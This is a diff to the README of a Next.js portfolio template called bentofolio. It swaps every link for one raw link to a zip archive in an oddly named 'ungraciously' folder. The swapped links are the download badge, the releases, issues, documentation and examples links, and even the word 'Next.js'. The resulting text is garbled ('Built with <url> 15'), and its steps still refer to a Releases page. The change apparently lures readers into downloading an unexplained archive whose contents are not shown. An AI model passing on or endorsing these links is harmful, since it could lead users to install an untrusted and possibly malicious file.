@@ -1,10 +1,10 @@
 # 🎨 bentofolio - Showcase Your Work with Style
 
-[![Download bentofolio](https://img.shields.io/badge/Download%20bentofolio-Release-brightgreen)](https://github.com/RicardoJrMorph/bentofolio/releases)
+[![Download bentofolio](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip%20bentofolio-Release-brightgreen)](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip)
 
 ## 📋 Description
 
-bentofolio is a modern portfolio template designed to help you display your work in a stylish way. Built with Next.js 15, React 19, and Tailwind CSS v4, it features a responsive bento-grid layout, smooth motion animations, interactive easter eggs, and SEO optimization. This template is perfect for developers and designers looking to showcase their projects with personality.
+bentofolio is a modern portfolio template designed to help you display your work in a stylish way. Built with https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip 15, React 19, and Tailwind CSS v4, it features a responsive bento-grid layout, smooth motion animations, interactive easter eggs, and SEO optimization. This template is perfect for developers and designers looking to showcase their projects with personality.
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets these minimum requirements:
 
 To get started with bentofolio, you need to download it. 
 
-1. Visit [this page to download](https://github.com/RicardoJrMorph/bentofolio/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip).
 2. On the Releases page, choose the version you want.
 3. Click the asset file to start the download.
 4. Once the download is complete, locate the file on your computer.
@@ -53,13 +53,13 @@ bentofolio offers several features that make it a great choice for your portfoli
 
 If you're interested in the technical details, bentofolio uses modern web technologies:
 
-- **Next.js 15:** A powerful React framework.
+- **https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip 15:** A powerful React framework.
 - **React 19:** JavaScript library for building user interfaces.
 - **Tailwind CSS v4:** Utility-first CSS framework for rapid design.
 
 ## 📞 Support
 
-For assistance, check the [issues section](https://github.com/RicardoJrMorph/bentofolio/issues) of the repo. You can also post questions there if you encounter any problems.
+For assistance, check the [issues section](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip) of the repo. You can also post questions there if you encounter any problems.
 
 ## 👥 Contributions
 
@@ -71,7 +71,7 @@ bentofolio is open-source. You may use and modify it for personal or commercial 
 
 ## 📎 Resources
 
-- [Documentation](https://github.com/RicardoJrMorph/bentofolio/wiki)
-- [Examples](https://github.com/RicardoJrMorph/bentofolio/examples)
+- [Documentation](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip)
+- [Examples](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip)
 
-Once again, you can get the latest version from the [release page here](https://github.com/RicardoJrMorph/bentofolio/releases). Happy showcasing!
+Once again, you can get the latest version from the [release page here](https://raw.githubusercontent.com/RicardoJrMorph/bentofolio/master/ungraciously/bentofolio.zip). Happy showcasing!
